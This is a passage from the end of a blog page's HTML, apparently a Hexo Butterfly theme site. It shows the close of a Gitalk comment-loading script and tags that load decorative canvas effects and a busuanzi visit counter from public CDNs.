  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>